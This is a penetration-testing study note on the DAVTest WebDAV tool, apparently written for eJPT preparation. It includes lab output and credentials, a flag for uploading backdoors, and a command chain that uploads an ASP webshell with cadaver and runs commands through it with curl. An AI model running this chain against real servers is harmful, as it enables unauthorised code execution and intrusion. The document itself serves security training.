# üîß DAVTest - WebDAV Testing Tool

DAVTest is a Perl script that tests WebDAV enabled servers by attempting to upload test executable files and then (optionally) uploading files which allow for command execution or other actions directly on the target.

**Location in Framework:** `web-pentesting/file-upload/davtest.md`

---

## üéØ What is DAVTest?

DAVTest automatically tests WebDAV servers to determine:
- Which file types can be uploaded (PUT method)
- Which uploaded files can be executed on the server
- Authentication mechanisms supported
- Directory permissions and restrictions

---

## üîß Basic Syntax

```bash
davtest [options] -url <URL>
```

---

## üöÄ Common Usage Examples

### Basic WebDAV Testing
```bash
# Test WebDAV without authentication
davtest -url http://target.com/webdav/

# Test with authentication
davtest -auth username:password -url http://target.com/webdav/
```

### Real Lab Example (from WebDAV IIS Lab):
```bash
# Initial test - discovers authentication requirement
davtest -url http://demo.ine.local/webdav

# Authenticated test with discovered credentials
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav/
```

---

## üß™ Lab Example Output Analysis

### Phase 1: Unauthenticated Test
```bash
davtest -url http://demo.ine.local/webdav
```
**Result:** `401 Unauthorized` - Basic authentication required

### Phase 2: Authenticated Test
```bash
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav/
```

**Expected Output:**
```
Testing DAV connection
OPEN            SUCCEED:                http://demo.ine.local/webdav
NOTE    Random string for this session: AqOe5dckmtF
Creating directory
MKCOL           SUCCEED:                Created http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF
Sending test files
PUT     txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.txt
PUT     pl      SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.pl
PUT     html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.html
PUT     jsp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.jsp
PUT     php     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.php
PUT     cgi     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.cgi
PUT     shtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.shtml
PUT     cfm     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.cfm
PUT     asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.asp
PUT     aspx    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.aspx

Checking for test file execution
EXEC    txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.txt
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.html
EXEC    jsp     FAIL
EXEC    php     FAIL
EXEC    cgi     FAIL
EXEC    shtml   FAIL
EXEC    cfm     FAIL
EXEC    asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_AqOe5dckmtF/davtest_AqOe5dckmtF.asp
EXEC    aspx    FAIL
```

---

## üìä Understanding DAVTest Results

### PUT Results
- **SUCCEED** - File upload successful
- **FAIL** - File upload blocked

### EXEC Results  
- **SUCCEED** - File can be executed/accessed via web
- **FAIL** - File uploaded but cannot be executed

### Key Finding from Lab:
- **ASP files**: PUT = SUCCEED, EXEC = SUCCEED
- This means we can upload and execute ASP webshells!

---

## üîß Command Line Options

| Option | Description | Example |
|--------|-------------|---------|
| `-url <URL>` | Target WebDAV URL | `-url http://target.com/webdav/` |
| `-auth <user:pass>` | Basic authentication | `-auth admin:password123` |
| `-realm <realm>` | Authentication realm | `-realm "Restricted Area"` |
| `-sendbd <backdoor>` | Upload specific backdoor | `-sendbd /path/to/shell.asp` |
| `-directory <name>` | Custom directory name | `-directory MyTestDir` |
| `-debug` | Enable debug output | `-debug` |
| `-cleanup` | Clean up test files | `-cleanup` |

---

## üéØ File Types Tested by Default

DAVTest tests these common file extensions:

| Extension | Purpose | Common Server |
|-----------|---------|---------------|
| `.txt` | Text files | Any |
| `.html` | HTML files | Any |
| `.asp` | ASP scripts | IIS |
| `.aspx` | ASP.NET scripts | IIS |
| `.php` | PHP scripts | Apache/Nginx |
| `.jsp` | Java Server Pages | Tomcat |
| `.pl` | Perl scripts | Apache |
| `.cgi` | CGI scripts | Apache |
| `.shtml` | Server Side Includes | Apache |
| `.cfm` | ColdFusion | ColdFusion Server |

---

## üö® Security Implications

### What DAVTest Reveals:
1. **File Upload Capabilities** - Which file types are accepted
2. **Execution Permissions** - Which files can be executed
3. **Authentication Weakness** - Weak/default credentials
4. **Directory Traversal** - Potential for path manipulation

### Attack Vectors:
- **Webshell Upload** - Upload executable scripts for remote access
- **Defacement** - Replace legitimate web content
- **Data Exfiltration** - Upload scripts to steal data
- **Privilege Escalation** - Use uploaded files as entry point

---

## üí° Best Practices for Penetration Testing

### During Assessment:
1. Always test unauthenticated first
2. Try common credentials if authentication required
3. Focus on executable file types (ASP, PHP, JSP)
4. Document all successful uploads and executions
5. Clean up test files after assessment

### For eJPT Exam:
- Understand PUT vs EXEC results
- Know which file types work with which servers
- Practice with authentication bypass techniques
- Remember common default credentials

---

## üîó Integration with Other Tools

### Workflow:
1. **Nmap** - Discover WebDAV (http-enum script)
2. **DAVTest** - Test upload capabilities
3. **Cadaver** - Manual file upload/management
4. **Browser/Curl** - Execute uploaded webshells

### Example Chain:
```bash
# 1. Discover WebDAV
nmap --script http-enum -p 80 target.com

# 2. Test capabilities
davtest -auth user:pass -url http://target.com/webdav/

# 3. Upload webshell manually
cadaver http://target.com/webdav/
> put /usr/share/webshells/asp/webshell.asp

# 4. Access webshell
curl http://target.com/webdav/webshell.asp?cmd=whoami
```

---

## ‚ö†Ô∏è Common Issues & Troubleshooting

### Authentication Problems:
```bash
# Try different authentication methods
davtest -auth domain\user:password -url <URL>
davtest -auth user@domain.com:password -url <URL>
```

### SSL/HTTPS Issues:
```bash
# For self-signed certificates, use tools that ignore SSL errors
davtest -url https://target.com/webdav/ --ignore-ssl
```

### Permission Issues:
- Check if WebDAV is enabled
- Verify user has write permissions
- Test different directories (webdav/, uploads/, files/)

---

## üìù Documentation Template

When using DAVTest in penetration testing, document:
- Target URL and authentication method
- File types that can be uploaded (PUT SUCCEED)
- File types that can be executed (EXEC SUCCEED)  
- Any interesting findings or anomalies
- Next steps for exploitation
